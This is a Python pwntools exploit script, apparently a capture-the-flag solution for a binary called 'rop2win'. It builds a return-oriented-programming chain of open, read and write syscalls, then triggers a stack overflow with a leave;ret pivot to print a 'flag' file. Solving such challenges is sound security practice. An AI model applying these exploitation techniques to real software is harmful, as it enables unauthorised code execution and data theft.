from pwn import *
from sqlalchemy import over
context.arch = "amd64"
context.terminal = ['tmux','splitw','-h']

# p = gdb.debug("./rop2win", gdbscript="""init-pwndbg
# b *0x401ebd
# b *0x4df360""")

p = process("./rop2win")

fn_addr  = 0x4df460
rop_addr = 0x4df360

pop_rax_ret = 0x00000000004607e7
pop_rdi_ret = 0x000000000040186a
pop_rsi_ret = 0x00000000004028a8
pop_rdx_ret = 0x000000000040176f
syscall_ret = 0x000000000042cea4
leave_ret   = 0x0000000000401ebd

fn = b"flag"

# open(fn, 0)
# read(3, fn, 0x20)
# write(1, fn, 0x20)
rop = flat(
    b"a"*0x8,
    pop_rax_ret, 2,
    pop_rdi_ret, fn_addr,
    pop_rsi_ret, 0,
    syscall_ret, 

    pop_rax_ret, 0,
    pop_rdi_ret, 3,
    pop_rsi_ret, fn_addr,
    pop_rdx_ret, 0x20,
    syscall_ret, 

    pop_rax_ret, 1,
    pop_rdi_ret, 1,
    # pop_rsi_ret, fn_addr,
    # pop_rdx_ret, 0x20,
    syscall_ret, 
)
overflow = flat(b"a"*32, p64(rop_addr), p64(leave_ret))
# overflow = b"Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab"

p.sendafter(b"Give me filename: ", fn)
p.sendafter(b"Give me ROP: ", rop)
p.sendafter(b"Give me overflow: ", overflow)

p.interactive()
